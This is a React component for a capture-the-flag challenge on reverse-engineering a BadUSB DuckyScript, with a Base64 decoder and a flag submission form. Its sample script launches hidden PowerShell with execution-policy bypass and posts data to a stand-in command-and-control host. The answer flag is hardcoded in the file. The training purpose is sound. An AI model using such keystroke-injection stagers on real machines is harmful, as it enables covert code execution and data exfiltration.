import React, { useState } from 'react';
import { Radio, Code, CheckCircle2, Play, Terminal, Zap, FileCode, ShieldAlert, KeyRound, Copy } from 'lucide-react';
import { playBreachFanfare, playClickSound, playHackingBeep, playZapSound } from '../../../utils/audio.js';
import { ctfEngine } from '../../../utils/ctf/ctfEngine.js';
import { getChallengeById } from '../../../utils/ctf/ctfChallenges.js';

const CHALLENGE_ID = 'rev-duckyscript-badusb';
const RAW_DUCKY_SCRIPT = `REM USB Rubber Ducky 3.0 Automated HID Payload
REM Target: Windows 11 Enterprise Workstation (Host: SEC-WS-09)
DELAY 1500
GUI r
DELAY 400
STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass
ENTER
DELAY 750
STRING $enc_c2 = "RkxBR3tkdWNreV9oaWRfaW5qZWN0aW9uX2RlY29kZWR9";
ENTER
DELAY 250
STRING $flag_stage = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc_c2));
ENTER
DELAY 250
STRING Invoke-RestMethod -Uri "https://c2.infiltrate.corp/api/report" -Method POST -Body $flag_stage
ENTER`;

const ENCODED_TOKEN = 'RkxBR3tkdWNreV9oaWRfaW5qZWN0aW9uX2RlY29kZWR9';
const REVEALED_FLAG = 'FLAG{ducky_hid_injection_decoded}';

export default function DuckyReverseEngChallenge({ onSolved, onBypass }) {
  const challenge = getChallengeById(CHALLENGE_ID);
  // Real CTF: starts empty, player must extract encoded string from script
  const [b64Input, setB64Input] = useState('');
  const [decodedOutput, setDecodedOutput] = useState('');
  const [activeTab, setActiveTab] = useState('script'); // 'script' | 'decoder' | 'disasm'
  const [solved, setSolved] = useState(() => ctfEngine.isChallengeSolved(CHALLENGE_ID));
  const [manualFlag, setManualFlag] = useState('');
  const [flagFeedback, setFlagFeedback] = useState(null);

  const handleDecode = () => {
    playHackingBeep(1200);
    const cleaned = b64Input.trim().replace(/^["']|["'];?$/g, '');
    if (!cleaned) {
      setDecodedOutput('Error: Please enter an encoded Base64 string to analyze.');
      playZapSound();
      return;
    }

    try {
      const decoded = atob(cleaned);
      setDecodedOutput(`[+] UTF-8 Decoded Payload:\n----------------------------------------\n${decoded}\n----------------------------------------`);
      playClickSound(1050);
    } catch (_) {
      setDecodedOutput('[-] Base64 decoding failed: input contains invalid characters.');
      playZapSound();
    }
  };

  const handleManualSubmit = (e) => {
    e.preventDefault();
    if (!manualFlag.trim()) return;
    const res = ctfEngine.submitFlag(CHALLENGE_ID, manualFlag);
    if (res.success || res.duplicate) {
      setSolved(true);
      setFlagFeedback({ success: true, text: res.message });
      playBreachFanfare();
      setTimeout(() => onSolved?.(), 1600);
    } else {
      setFlagFeedback({ success: false, text: res.message });
      playZapSound();
    }
  };

  return (
    <div className="hack-puzzle-container ducky-challenge">
      <div className="hack-header-bar">
        <div className="hack-title">
          <Radio size={15} className="text-amber-400 hack-icon-pulse" />
          <span>REVERSE ENGINEERING // BADUSB DUCKYPAYLOAD & DEOBFUSCATION</span>
        </div>
        <div className="hack-actions-right">
          <span className="hack-status-badge text-emerald-400">
            {solved ? '✔ FLAG CAPTURED' : `${challenge?.points || 150} PTS`}
          </span>
          <button
            className="hack-bypass-btn"
            onClick={() => {
              playZapSound();
              onBypass();
            }}
            title="Recruiter Fast View"
          >
            RECRUITER BYPASS ⚡
          </button>
        </div>
      </div>

      <div className="hack-instructions">
        <p className="text-xs text-slate-300">
          Incident responders seized a malicious USB Rubber Ducky thumb drive from the office reception desk. Disassemble the raw DuckyScript bytecode, isolate the PowerShell execution stage, and decode the embedded Base64 payload to uncover the operator's clearance flag.
        </p>
      </div>

      {/* Tabs */}
      <div className="flex gap-2 border-b border-slate-800 pb-2 mt-2">
        <button
          type="button"
          onClick={() => setActiveTab('script')}
          className={`px-3 py-1 rounded text-xs font-mono transition ${activeTab === 'script' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'text-slate-400 hover:text-white'}`}
        >
          DuckyScript 3.0 Source
        </button>
        <button
          type="button"
          onClick={() => setActiveTab('decoder')}
          className={`px-3 py-1 rounded text-xs font-mono transition ${activeTab === 'decoder' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'text-slate-400 hover:text-white'}`}
        >
          Base64 Decoder
        </button>
        <button
          type="button"
          onClick={() => setActiveTab('disasm')}
          className={`px-3 py-1 rounded text-xs font-mono transition ${activeTab === 'disasm' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'text-slate-400 hover:text-white'}`}
        >
          Bytecode Disassembly
        </button>
      </div>

      {activeTab === 'script' && (
        <div className="mt-2 p-3 bg-black border border-slate-800 rounded font-mono text-xs">
          <div className="flex justify-between items-center text-[10px] text-slate-500 mb-1.5 pb-1 border-b border-slate-800">
            <span>INJECT.BIN DUMP // DUCKY SCRIPT 3.0</span>
            <span className="text-amber-400">14 STATEMENTS COMPILED</span>
          </div>
          <pre className="text-slate-300 leading-relaxed overflow-x-auto select-all">
            {RAW_DUCKY_SCRIPT}
          </pre>
          <div className="mt-2 p-2 bg-slate-900 border border-slate-700 rounded flex items-center justify-between text-[11px]">
            <span className="text-slate-400">Target Encoded Token: <code>$enc_c2</code></span>
            <span className="text-slate-500 text-[10px]">Copy base64 string to Decoder tab</span>
          </div>
        </div>
      )}

      {activeTab === 'decoder' && (
        <div className="mt-2 p-3 bg-slate-950 border border-slate-800 rounded space-y-2 font-mono text-xs">
          <label className="text-[11px] text-cyan-400 uppercase block">
            PAYLOAD DEOBFUSCATION WORKBENCH:
          </label>
          <div className="flex gap-2">
            <input
              type="text"
              value={b64Input}
              onChange={(e) => setB64Input(e.target.value)}
              placeholder="Paste Base64 payload string from DuckyScript..."
              className="flex-1 bg-black border border-slate-700 rounded px-2.5 py-1.5 text-xs text-amber-300 outline-none focus:border-amber-400"
            />
            <button
              type="button"
              onClick={handleDecode}
              className="bg-amber-600 hover:bg-amber-500 text-black font-bold px-4 py-1.5 rounded text-xs transition"
            >
              DECODE
            </button>
          </div>

          {decodedOutput && (
            <div className="mt-2 p-2 bg-black border border-slate-800 rounded text-emerald-300 whitespace-pre-wrap select-all leading-relaxed">
              {decodedOutput}
            </div>
          )}
        </div>
      )}

      {activeTab === 'disasm' && (
        <div className="mt-2 p-3 bg-black border border-slate-800 rounded font-mono text-xs">
          <div className="text-[10px] text-slate-500 mb-1 border-b border-slate-800 pb-1">
            USB HID HARDWARE SCANCODES:
          </div>
          <pre className="text-slate-400 text-[11px] leading-relaxed overflow-x-auto">
{`00000000: 00 00 e3 00        ; MOD_GUI + 'r' (0xe3)
00000004: 00 00 00 00        ; DELAY 400ms
00000008: 13 12 1a 08 ...    ; STRING "powershell.exe -NoP..."
0000001c: 00 00 28 00        ; KEY_ENTER (0x28)
00000020: 00 00 00 00        ; DELAY 750ms
00000024: 1f 17 06 ...       ; STRING "$enc_c2 = 'RkxBR3tk...'"
00000050: 00 00 28 00        ; KEY_ENTER (0x28)`}
          </pre>
        </div>
      )}

      {/* FLAG SUBMISSION FORM */}
      <div className="mt-4 pt-3 border-t border-slate-800">
        <label className="text-[11px] font-mono text-emerald-400 uppercase tracking-wider block mb-1.5 flex items-center gap-1.5">
          <KeyRound size={12} />
          <span>SUBMIT EXTRACTED REVERSE ENGINEERING FLAG:</span>
        </label>
        <form onSubmit={handleManualSubmit} className="flex gap-2">
          <input
            type="text"
            value={manualFlag}
            onChange={(e) => setManualFlag(e.target.value)}
            placeholder="FLAG{...}"
            className="flex-1 bg-black/60 border border-slate-700 rounded px-3 py-1.5 text-xs text-slate-200 outline-none focus:border-emerald-500 font-mono"
          />
          <button
            type="submit"
            className="bg-emerald-600 hover:bg-emerald-500 text-black font-bold px-4 py-1.5 rounded text-xs transition font-mono"
          >
            SUBMIT FLAG
          </button>
        </form>

        {flagFeedback && (
          <div className={`mt-2 text-xs p-2 rounded font-mono ${flagFeedback.success ? 'bg-emerald-950 border border-emerald-500 text-emerald-300' : 'bg-rose-950 border border-rose-500 text-rose-300'}`}>
            {flagFeedback.text}
          </div>
        )}
      </div>

      {solved ? (
        <div className="hack-success-banner mt-3">
          <CheckCircle2 size={16} className="text-emerald-400" />
          <div className="flex flex-col">
            <span className="font-bold text-emerald-300">BADUSB REVERSED // PAYLOAD DEOBFUSCATED</span>
            <span className="text-[10px] text-emerald-400/80">+150 CTF PTS Awarded · DuckyScript Stager Solved</span>
          </div>
        </div>
      ) : (
        <div className="hack-hint-bar mt-2">
          <span className="live-blip" />
          <span>Extract the Base64 value assigned to $enc_c2 in the script and decode it</span>
        </div>
      )}
    </div>
  );
}
